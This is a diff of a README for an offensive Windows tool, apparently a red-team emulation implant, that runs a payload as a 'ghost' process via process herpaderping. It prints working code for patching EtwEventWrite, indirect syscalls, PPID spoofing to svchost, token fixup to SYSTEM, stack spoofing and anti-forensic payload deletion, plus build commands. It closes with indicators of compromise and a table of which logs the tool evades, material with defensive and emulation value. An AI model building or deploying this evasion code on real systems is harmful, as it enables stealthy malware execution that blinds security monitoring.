@@ -1,64 +1,113 @@
-# Process Herpaderping: Transactional Ghost Process Injection
+# Process Herpaderping: Ghost Process via SEC_IMAGE Section
 
 ## Technique
 
-**MITRE ATT&CK:** T1055 - Process Injection (Herpaderping Variant)
+**MITRE ATT&CK:** T1055 — Process Injection (Herpaderping Variant)
 
-_Note: While similar to Process Doppelgänging (T1055.013), Herpaderping does not use TxF to overwrite a legitimate executable. Instead, it creates a ghost process directly from a memory section without file manipulation, making it a distinct evasion technique._
-
-## Description
-
-This tool creates a "ghost" process using memory sections and potential transaction manipulation, then injects an executable payload into it. Unlike Process Doppelgänging, it does not overwrite a legitimate file with malicious code via TxF. Instead, the payload is loaded from a separate file into a memory section, the file is deleted for anti-forensics, and a process is spawned from the section. The resulting process has no on-disk footprint and appears as a phantom execution, evading detection.
+_Herpaderping creates a ghost process by mapping a payload into a memory section and spawning a process from that section. After the process is created but before the thread starts, the on-disk file backing the section is overwritten with junk. The running process therefore has no valid on-disk image — forensic reads of the file see garbage while the process executes from the original in-memory section. This is distinct from Process Doppelgänging (T1055.013), which uses NTFS transactions (TxF) — CWLHerpaderping does **not** use TxF._
 
 ## Execution Flow
 
-```mermaid
-flowchart TD
-    A[Start] --> B[Read payload.exe into buffer]
-    B --> C[Delete payload file\nAnti-forensic]
-    C --> D[NtCreateSection\nCreate memory section]
-    D --> E[GetNonJobParent\nsvchost.exe Session 0 filter\n→ ProcessIdToSessionId check]
-    E --> F{NtCreateProcessEx\nCreate ghost process\nwith spoofed parent}
-    F -->|No| G[Exit with error]
-    F -->|Yes| H[Token Fixup\nOpenProcessToken → DuplicateTokenEx\n→ NtSetInformationProcess ProcessAccessToken]
-    H --> I[NtAllocateVirtualMemory\nAllocate memory in ghost process]
-    I --> J{NtWriteVirtualMemory\nWrite payload to allocated memory}
-    J -->|No| G
-    J -->|Yes| K[GetEntryPoint\nCalculate payload entry point]
-    K --> L[NtCreateThreadEx\nCreate thread to execute payload]
-    L --> M{Thread Created?}
-    M -->|No| G
-    M -->|Yes| N[Ghost process executes payload\nNo disk trace\nParent = svchost.exe Session 0\nToken = caller token]
-    N --> O[End]
+```
+main()
+ └─ PatchEtw()                         ← B1: suppress ETW (T1562.006)
+ └─ GetPayloadBuffer()
+     ├─ CreateFileW(PAYLOAD_PATH)
+     ├─ ReadFile → heap buffer
+     └─ DeleteFileW(PAYLOAD_PATH)       ← anti-forensic: payload removed from disk
+ └─ Herpaderping(buffer, size)
+     ├─ InitSyscallPool / INDIRECT_SYSCALL × 5   ← B2: indirect syscalls
+     ├─ SealSyscallPool()               ← flip stub page to PAGE_EXECUTE_READ
+     ├─ GetTempFileNameW (prefix "HD") → hTemp
+     ├─ WriteFile(payload → hTemp)
+     ├─ NtCreateSection(SEC_IMAGE, hTemp) [StackSpoof]
+     ├─ GetNonJobParent()               ← B3: PPID spoof (svchost/wininit Session 0)
+     ├─ NtCreateProcessEx(section, parent) [StackSpoof]
+     ├─ NtSetInformationProcess(ProcessAccessToken=9) ← B4: token fixup [GetProcAddress]
+     ├─ NtQueryInformationProcess → pbi [GetProcAddress]
+     ├─ GetEntryPoint(hProcess, payload, pbi)
+     ├─ SetFilePointer(hTemp, 0) + WriteFile loop  ← overwrite with "Hello From CyberWarFare Labs"
+     ├─ RtlCreateProcessParametersEx(RuntimeBroker.exe) [GetProcAddress]
+     ├─ NtAllocateVirtualMemory(hProcess, paramBuffer) [StackSpoof]
+     ├─ NtWriteVirtualMemory(hProcess, processParameters) [StackSpoof]
+     ├─ WriteProcessMemory(&remotePEB->ProcessParameters) ← Win32, not spoofed
+     └─ NtCreateThreadEx(hProcess, entryPoint) [StackSpoof]
 ```
 
-### Steps Detail
+## Steps Detail
 
-| Step | API Call                       | Description                                                               |
-| ---- | ------------------------------ | ------------------------------------------------------------------------- |
-| 1    | `CreateFile` / `ReadFile`      | Read payload EXE from file into memory buffer                             |
-| 2    | `DeleteFile`                   | Self-delete payload file for anti-forensics                               |
-| 3    | `NtCreateSection`              | Create memory section containing payload                                  |
-| 4    | `GetNonJobParent()`            | **[PATCH]** Find `svchost.exe` / `wininit.exe` in Session 0 as PPID spoof target |
-| 5    | `NtCreateProcessEx`            | **[PATCH]** Create ghost process with spoofed parent (Session 0, non-PPL)  |
-| 6    | `NtSetInformationProcess` (9)  | **[PATCH]** Assign caller token to ghost process (token fixup)            |
-| 7    | `NtAllocateVirtualMemory`      | Allocate executable memory in ghost process                               |
-| 8    | `NtWriteVirtualMemory`         | Write payload to allocated memory                                         |
-| 9    | `NtCreateThreadEx`             | Create thread to execute payload at entry point                           |
+| Step | API / Action | Description |
+|------|-------------|-------------|
+| 0 | `PatchEtw()` | Patch `ntdll!EtwEventWrite` → `xor eax,eax; ret` — suppress ETW before any NT call (T1562.006) |
+| 1 | `CreateFileW` / `ReadFile` | Read payload from `PAYLOAD_PATH` into heap buffer |
+| 2 | `DeleteFileW(PAYLOAD_PATH)` | Delete payload file immediately after read — anti-forensic |
+| 3 | `InitSyscallPool` / `INDIRECT_SYSCALL` × 5 | Resolve SSNs for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`; `SealSyscallPool()` flips stub page to `PAGE_EXECUTE_READ` |
+| 4 | `GetTempFileNameW` / `CreateFileW` | Create temp file in `%TEMP%` with prefix `HD` to hold payload bytes |
+| 5 | `WriteFile` | Write payload bytes into temp file |
+| 6 | `NtCreateSection(SEC_IMAGE)` | Create image section from temp file handle **[StackSpoof]** |
+| 7 | `GetNonJobParent()` | Enumerate processes; find `svchost.exe` → fallback `wininit.exe` in Session 0 |
+| 8 | `NtCreateProcessEx(section, parent)` | Spawn ghost process from section with spoofed PPID **[StackSpoof]** |
+| 9 | `NtSetInformationProcess(class=9)` | Assign duplicate of caller's primary token to ghost (`ProcessAccessToken`) **[GetProcAddress]** |
+| 10 | `NtQueryInformationProcess` | Read ghost `PebBaseAddress` → used for entry point calculation **[GetProcAddress]** |
+| 11 | Temp file overwrite | `SetFilePointer(0)` + `WriteFile` loop fills `HD*.tmp` with `L"Hello From CyberWarFare Labs\n"` junk |
+| 12 | `RtlCreateProcessParametersEx` | Build spoofed `RTL_USER_PROCESS_PARAMETERS` with `ImagePathName = RuntimeBroker.exe` **[GetProcAddress]** |
+| 13 | `NtAllocateVirtualMemory` | Allocate `RW` memory in ghost process for process parameters **[StackSpoof]** |
+| 14 | `NtWriteVirtualMemory` | Write process parameters struct into allocated memory **[StackSpoof]** |
+| 15 | `WriteProcessMemory` | Patch `remotePEB->ProcessParameters` pointer to spoofed struct — Win32 call, **not StackSpoofed** |
+| 16 | `NtCreateThreadEx(entryPoint)` | Start thread at payload entry point in ghost process **[StackSpoof]** |
+
+> **Key:** `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` (steps 13–14) are for **process parameters / PEB spoofing**, not for writing the payload. The payload enters the ghost process via the `NtCreateSection` section mapped at step 6 — no separate write of payload bytes into remote memory.
 
 ## Patches Applied
 
-### 1. PPID Spoofing — `GetNonJobParent()` with Session 0 Filter (`CWLImplant.cpp` line 13–34)
+### B1 — ETW Patch (`CWLImplant.cpp` line 19–28)
 
-**File:** `CWLHerpaderping/CWLImplant.cpp`  
-**Purpose:** `NtCreateProcessEx` inherits the session and job object constraints of its parent process. On IIS servers, the calling process may be inside an IIS Job Object. By using a Session 0 non-PPL process (`svchost.exe`, fallback `wininit.exe`) as the parent, the ghost process is created in Session 0 with no Job Object, blending with normal Windows service behavior.
+**Purpose:** `EtwEventWrite` in `ntdll.dll` is the function EDR sensors hook to receive kernel-originated ETW events (e.g., `NtCreateSection`, `NtCreateProcessEx`). Patching it to `xor eax,eax; ret` suppresses those events for the lifetime of the process.
 
-**Key constraint — Session 0 filter:** `explorer.exe` and other interactive processes run in Session 1+ (one per logged-in user). Spoofing to a Session 1 parent while the ghost runs as SYSTEM causes a session anomaly and immediate termination. The filter ensures only Session 0 candidates are used regardless of who is logged in.
+```cpp
+static void PatchEtw()
+{
+    HMODULE hNtdll = GetNtdllBase();
+    PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
+    if (!pEtw) return;
+    DWORD old = 0;
+    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
+    memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
+    VirtualProtect(pEtw, 4, old, &old);
+}
+```
+
+**Called first** in `main()` before any NT API, so DC0021 (OS API Execution) telemetry is suppressed for all subsequent calls.
+
+---
+
+### B2 — Indirect Syscalls (`CWLImplant.cpp` line 119–129, `syscall.h`)
+
+Five injection-critical APIs use **indirect syscall stubs** built at runtime by `InitSyscallPool`:
+
+```cpp
+INDIRECT_SYSCALL(_NtCreateSection,         pNtCreateSection,         NtCreateSection);
+INDIRECT_SYSCALL(_NtCreateProcessEx,       pNtCreateProcessEx,       NtCreateProcessEx);
+INDIRECT_SYSCALL(_NtAllocateVirtualMemory, pNtAllocateVirtualMemory, NtAllocateVirtualMemory);
+INDIRECT_SYSCALL(_NtWriteVirtualMemory,    pNtWriteVirtualMemory,    NtWriteVirtualMemory);
+INDIRECT_SYSCALL(_NtCreateThreadEx,        pNtCreateThreadEx,        NtCreateThreadEx);
+SealSyscallPool();  // flip stub page PAGE_RWX → PAGE_EXECUTE_READ
+```
+
+Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11` — the gadget (`syscall;ret`) lives inside `ntdll .text`, so the CPU sees the syscall as originating from `ntdll`, not from the stub page. EDR user-mode hooks in `ntdll` are bypassed.
+
+Non-injection APIs (`NtQueryInformationProcess`, `RtlCreateProcessParametersEx`, `RtlInitUnicodeString`, `NtSetInformationProcess`) are resolved via `RESOLVE_API` (EAT-walk `GetProcAddress`), not indirect syscalls.
+
+---
+
+### B3 — PPID Spoofing — `GetNonJobParent()` (`CWLImplant.cpp` line 30–51)
+
+**Purpose:** `NtCreateProcessEx` inherits session and job-object constraints from its parent handle. On IIS servers, the caller may be inside an IIS Job Object. Using a Session 0 non-PPL process as parent places the ghost in Session 0 with no Job Object.
 
 ```cpp
 static HANDLE GetNonJobParent()
 {
-    const wchar_t* targets[] = { L"svchost.exe", L"wininit.exe", NULL };
+    const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
     PROCESSENTRY32W pe = { sizeof(pe) };
@@ -80,36 +129,28 @@ static HANDLE GetNonJobParent()
 }
 ```
 
-Used in `Herpaderping()`:
-```cpp
-HANDLE hParent = GetNonJobParent();
-status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
-                             0, hSection, NULL, NULL, FALSE);
-if (hParent != GetCurrentProcess()) CloseHandle(hParent);
-```
+**Why `svchost.exe` first:** On Windows Server 2022, `wininit.exe` and `services.exe` may restrict `PROCESS_CREATE_PROCESS` even from SYSTEM. `svchost.exe` is non-PPL, always in Session 0, and reliably accessible. `wininit.exe` is the fallback if no `svchost.exe` handle can be opened.
 
-**Why `svchost.exe` and not `wininit.exe`/`services.exe`:** On Windows Server 2022, `wininit.exe` and `services.exe` restrict `PROCESS_CREATE_PROCESS` access even from SYSTEM. `svchost.exe` is non-PPL, always present in Session 0, and accessible from SYSTEM.
-
-**Side-effect:** `NtCreateProcessEx` inherits the token of the spoofed parent (`svchost.exe`) → fixed by patch #2.
+**Side-effect:** `NtCreateProcessEx` inherits the spoofed parent's token — fixed by B4.
 
 ---
 
-### 2. Token Fixup — `NtSetInformationProcess(ProcessAccessToken)` (`CWLImplant.cpp` line 202–222)
+### B4 — Token Fixup — `NtSetInformationProcess(ProcessAccessToken)` (`CWLImplant.cpp` line 239–256)
 
-**File:** `CWLHerpaderping/CWLImplant.cpp`  
-**Header:** `CWLHerpaderping/CWLInc.h` (added `PROCESS_ACCESS_TOKEN` struct and `_NtSetInformationProcess` typedef)  
-**Purpose:** After PPID spoofing, the ghost process inherits `svchost.exe`'s token. This patch immediately reassigns the ghost process's primary token to a duplicate of the calling process's token. When `CertEnrollSvc.exe` (EfsPotato) calls `CertEnrollAgent.exe` as SYSTEM, the ghost process will therefore run as `NT AUTHORITY\SYSTEM`.
+**Purpose:** Ghost process inherits `svchost.exe`'s token after PPID spoof. This patch immediately re-assigns the ghost's primary token to a duplicate of the **calling process's** token — ensuring the ghost runs as SYSTEM (when called via EfsPotato) or as the domain user (when called from the workstation path).
 
 ```cpp
-_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(
-    GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+_NtSetInformationProcess pNtSetInformationProcess =
+    (_NtSetInformationProcess)RESOLVE_API(hNtdll, NtSetInformationProcess);
 if (pNtSetInformationProcess)
 {
     HANDLE hToken = NULL;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
+    if (OpenProcessToken(GetCurrentProcess(),
+            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
     {
         HANDLE hPrimary = NULL;
-        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hPrimary))
+        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
+                SecurityIdentification, TokenPrimary, &hPrimary))
         {
             PROCESS_ACCESS_TOKEN pat = { hPrimary, NULL };
             pNtSetInformationProcess(hProcess, (PROCESSINFOCLASS)9, &pat, sizeof(pat));
@@ -120,7 +161,7 @@ if (pNtSetInformationProcess)
 }
 ```
 
-Definitions added to `CWLInc.h`:
+Definitions in `CWLInc.h` (line 235–244):
 ```c
 typedef struct _PROCESS_ACCESS_TOKEN {
     HANDLE Token;
@@ -136,45 +177,71 @@ typedef NTSYSAPI NTSTATUS(NTAPI* _NtSetInformationProcess)(
 
 ---
 
+### B5 — Stack Spoofing (`StackSpoof.cpp` / `StackSpoof.h`)
+
+All five indirect syscall calls are wrapped with `StackSpoofer`:
+
+```cpp
+StackSpoofer spoofer(OBFSTR("kernel32.dll"));
+spoofer.Activate();
+status = pNtCreateSection(&hSection, ...);
+spoofer.Deactivate();
+```
+
+`Activate()` plants a fake return address inside `kernel32.dll` on the stack before the syscall. EDR stack-walk inspection sees the call as originating from `kernel32.dll`, not from the stub page or the PE. `WriteProcessMemory` (PEB pointer patch, step 15) is a Win32 call and is **not** stack-spoofed.
+
+---
+
 ### Combined Effect
 
-| Scenario                        | Ghost Process Parent  | Ghost Session | Ghost Process Token         |
-| ------------------------------- | --------------------- | ------------- | --------------------------- |
-| Original (no patch)             | `CertEnrollAgent.exe` | Inherited     | Same as caller              |
-| After PPID patch only           | `svchost.exe`         | Session 0     | `svchost.exe` token         |
-| After PPID patch + token fixup  | `svchost.exe`         | Session 0     | Same as caller (**SYSTEM**) |
+| Scenario | Ghost PPID | Ghost Session | Ghost Token |
+|---|---|---|---|
+| No patches | `CertEnrollAgent.exe` | Inherited | Caller token |
+| PPID patch only | `svchost.exe` | Session 0 | `svchost.exe` token |
+| PPID + token fixup | `svchost.exe` | Session 0 | **Caller token (SYSTEM or domain user)** |
+
+## Payload Path
+
+Default compile-time path (`CWLImplant.cpp` line 13):
+
+```cpp
+#ifndef PAYLOAD_PATH
+#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
+#endif
+```
+
+Override at build time via MSBuild (used in emulation plan):
+
+```powershell
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 `
+    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /t:Rebuild /m
+```
+
+In the emulation plan the payload is deployed to `C:\ProgramData\CertCA.bin`.
 
 ## Payload Requirements
 
 - Format: Portable Executable (.exe), not raw shellcode
 - Architecture: x64
-- Position-independent: No hard-coded addresses
-- Entry point: Standard PE entry point
-- Self-contained: No external dependencies
-
-## Usage
-
-```
-CWLHerpaderping.exe
-
-```
-
-(Note: Payload must be placed at `C:\temp\payload64.exe` before execution)
+- Entry point: Standard PE entry point (`AddressOfEntryPoint`)
+- Self-contained: no external DLL dependencies at load time
 
 ## IOCs for Detection
 
-- NTFS transaction manipulation without visible file operations
-- Process creation from memory section (no ImagePath)
-- Cross-process memory allocation with `NtAllocateVirtualMemory`
-- Thread creation pointing to unbacked executable memory
-- API sequence: NtCreateSection → NtCreateProcessEx → NtWriteVirtualMemory → NtCreateThreadEx
+- Process whose on-disk image (`HD*.tmp`) contains junk (`Hello From CyberWarFare Labs`) that does not match the in-memory mapped section
+- `NtCreateProcessEx` called with a `SectionHandle` argument — spawning from section rather than from an image file path
+- `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` while `PEB.ImageBaseAddress` maps to a different PE
+- PPID of ghost process resolves to `svchost.exe` or `wininit.exe` in Session 0 despite the real parent being a non-service process
+- Stack return address in `kernel32.dll` for `ntdll` NT syscalls (fake return planted by StackSpoofer)
+- `EtwEventWrite` in `ntdll` patched to `xor eax,eax; ret` in calling process memory
+- API sequence: `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` → `NtSetInformationProcess(class=9)` → file-overwrite → `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `WriteProcessMemory` → `NtCreateThreadEx`
 
 ## Log Sources Coverage
 
-| Data Component                | Log Source                           | Channel/Event                                            | Detected?                     |
-| ----------------------------- | ------------------------------------ | -------------------------------------------------------- | ----------------------------- |
-| Process Creation (DC0032)     | WinEventLog:Sysmon                   | EventCode=1                                              | ❌ No (ghost process)         |
-| Process Access (DC0035)       | WinEventLog:Sysmon                   | EventCode=10                                             | ✅ Yes                        |
-| Process Modification (DC0020) | WinEventLog:Sysmon                   | EventCode=8                                              | ❌ No (no CreateRemoteThread) |
-| Module Load (DC0016)          | WinEventLog:Sysmon                   | EventCode=7                                              | ❌ No (EXE payload)           |
-| OS API Execution (DC0021)     | etw:Microsoft-Windows-Kernel-Process | NtCreateSection, NtCreateProcessEx, NtWriteVirtualMemory | ✅ Yes                        |
+| Data Component | Log Source | Channel/Event | Notes |
+|---|---|---|---|
+| Process Creation (DC0032) | WinEventLog:Sysmon | EventCode=1 | ❌ Ghost process — `ImageFileName` shows `RuntimeBroker.exe` but on-disk file is junk |
+| Process Access (DC0035) | WinEventLog:Sysmon | EventCode=10 | ✅ Yes — `NtCreateProcessEx` access on LSASS-adjacent processes |
+| File Creation (DC0016) | WinEventLog:Sysmon | EventCode=11 | ✅ `HD*.tmp` created then immediately overwritten |
+| OS API Execution (DC0021) | ETW:Microsoft-Windows-Kernel-Process | `NtCreateSection`, `NtCreateProcessEx` | ❌ Suppressed by `PatchEtw()` |
+| Thread Creation (DC0019) | WinEventLog:Sysmon | EventCode=8 | ❌ No `CreateRemoteThread` — uses `NtCreateThreadEx` directly |
